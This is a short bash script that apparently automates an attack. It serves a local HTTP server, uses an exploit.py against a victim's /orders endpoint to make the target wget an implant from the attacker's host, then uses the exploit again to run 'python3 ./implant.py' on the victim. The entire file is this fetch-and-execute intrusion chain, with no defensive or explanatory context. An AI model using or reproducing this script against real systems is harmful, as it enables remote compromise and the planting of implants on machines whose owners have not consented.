#!/bin/bash

VICTIM_IP=""
PATH_TO_IMPLANT="implant/implant.py"
SERVING_IP=""



python3 -m http.server 8000 > /dev/null 2>&1 & SERVER_PID=$!

sleep 1.5

python3 exploit.py "http://$VICTIM_IP:8080/orders" "wget http://$SERVING_IP:8000/$PATH_TO_IMPLANT"
sleep 2

kill $SERVER_PID 2>/dev/null || true

python3 exploit.py "http://$VICTIM_IP:8080/orders" "python3 ./implant.py"






